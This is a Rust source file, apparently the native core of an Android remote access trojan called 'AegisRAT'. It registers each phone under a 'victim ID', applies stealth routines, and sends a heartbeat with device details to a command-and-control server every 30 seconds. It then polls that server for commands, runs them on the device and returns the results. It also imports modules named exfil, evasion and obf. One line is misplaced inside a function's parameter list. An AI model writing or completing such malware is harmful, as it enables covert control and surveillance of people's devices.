use jni::JNIEnv;
use jni::objects::{JClass, JString};
use jni::sys::{jstring, jboolean, JNI_TRUE};
use once_cell::sync::Lazy;
use std::sync::Mutex;
use tokio::runtime::Runtime;
use jni::objects::JObject;

mod comms;
mod sysinfo;
mod exfil;
mod actions;
mod evasion;
mod obf;

static RUNTIME: Lazy<Mutex<Option<Runtime>>> = Lazy::new(|| Mutex::new(None));
static VICTIM_ID: Lazy<Mutex<Option<String>>> = Lazy::new(|| Mutex::new(None));
static C2_URL: Lazy<Mutex<Option<String>>> = Lazy::new(|| Mutex::new(None));
static DEVICE_INFO: Lazy<Mutex<Option<sysinfo::SystemInfo>>> = Lazy::new(|| Mutex::new(None));
static CONTEXT: Lazy<Mutex<Option<JObject>>> = Lazy::new(|| Mutex::new(None));

#[no_mangle]
pub extern "system" fn Java_com_aegis_rat_AegisCore_nativeInit(
    mut env: JNIEnv,
    _class: JClass,
    context: jni::objects::JObject,
    c2_url: JString,
    model: JString,
    android_version: JString,
    *CONTEXT.lock().unwrap() = Some(context);

) -> jboolean {
    // Initialize Logger
    android_logger::init_once(
        android_logger::Config::default()
            .with_max_level(log::LevelFilter::Debug)
            .with_tag("AegisRAT"),
    );

    let c2_url_str: String = env.get_string(&c2_url).unwrap().into();
    let model_str: String = env.get_string(&model).unwrap().into();
    let version_str: String = env.get_string(&android_version).unwrap().into();

    log::info!("[AEGIS] Initializing Core. C2: {}", c2_url_str);

    // Store Config
    *C2_URL.lock().unwrap() = Some(c2_url_str.clone());
    
    // Initialize Device Info with Real Values
    let device_info = sysinfo::SystemInfo {
        hostname: "AndroidDevice".to_string(), // TODO: Get real hostname via JNI
        os: "Android".to_string(),
        android_version: version_str,
        model: model_str,
        battery: 100, // TODO: Get real battery level via JNI
    };
    *DEVICE_INFO.lock().unwrap() = Some(device_info);

    // Get or Create Victim ID
    let victim_id = sysinfo::get_or_create_victim_id();
    *VICTIM_ID.lock().unwrap() = Some(victim_id.clone());
    log::info!("[AEGIS] Victim ID: {}", victim_id);

    // Apply Stealth
    evasion::apply_stealth();

    // Initialize Tokio Runtime
    {
        let mut rt_lock = RUNTIME.lock().unwrap();
        if rt_lock.is_none() {
            let rt = tokio::runtime::Builder::new_multi_thread()
                .worker_threads(4)
                .enable_all()
                .build()
                .expect("Failed to create Tokio runtime");
            *rt_lock = Some(rt);
        }
        
        let rt = rt_lock.as_ref().unwrap();
        rt.spawn(async move {
            aegis_main_loop(c2_url_str, victim_id).await;
        });
    }
    
    JNI_TRUE
}

#[no_mangle]
pub extern "system" fn Java_com_aegis_rat_AegisCore_nativeExecuteCommand(
    mut env: JNIEnv,
    _class: JClass,
    command: JString,
    args: JString,
) -> jstring {
    let cmd_str: String = env.get_string(&command).unwrap().into();
    let args_str: String = env.get_string(&args).unwrap().into();
    
    let handle = std::thread::Builder::new()
        .name("aegis-exec".to_string())
        .spawn(move || {
            let rt_lock = RUNTIME.lock().unwrap();
            if let Some(rt) = rt_lock.as_ref() {
                let result = rt.block_on(async {
                    actions::execute_command(&cmd_str, &args_str).await
                });
                serde_json::to_string(&result).unwrap_or_else(|_| "null".to_string())
            } else {
                serde_json::json!({"error": "Runtime not initialized"}).to_string()
            }
        })
        .expect("Failed to spawn execution thread");
    
    let result = handle.join().unwrap();
    env.new_string(result).unwrap().into_raw()
}

async fn aegis_main_loop(c2_url: String, victim_id: String) {
    tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
    
    let mut interval = tokio::time::interval(tokio::time::Duration::from_secs(30));
    
    loop {
        interval.tick().await;
        
        // 1. Send Heartbeat
        if let Some(info) = DEVICE_INFO.lock().unwrap().as_ref() {
            match comms::send_heartbeat(&c2_url, &victim_id, info).await {
                Ok(_) => log::debug!("[AEGIS] Heartbeat sent"),
                Err(e) => log::warn!("[AEGIS] Heartbeat failed: {}", e),
            }
        }

        // 2. Poll Commands
        match comms::poll_commands(&c2_url, &victim_id).await {
            Ok(cmds) => {
                for cmd in cmds {
                    log::info!("[AEGIS] Executing command: {}", cmd.action);
                    
                    // Execute Command
                    let result = actions::execute_command(&cmd.action, &cmd.args.to_string()).await;
                    
                    // 3. SEND RESPONSE BACK TO C2 (CRITICAL FIX)
                    let success = result.get("error").is_none();
                    if let Err(e) = comms::send_response(&c2_url, &victim_id, &cmd.id, success, result).await {
                        log::error!("[AEGIS] Failed to send response for {}: {}", cmd.id, e);
                    } else {
                        log::debug!("[AEGIS] Response sent for {}", cmd.id);
                    }
                }
            }
            Err(e) => log::warn!("[AEGIS] Poll failed: {}", e),
        }
    }
}
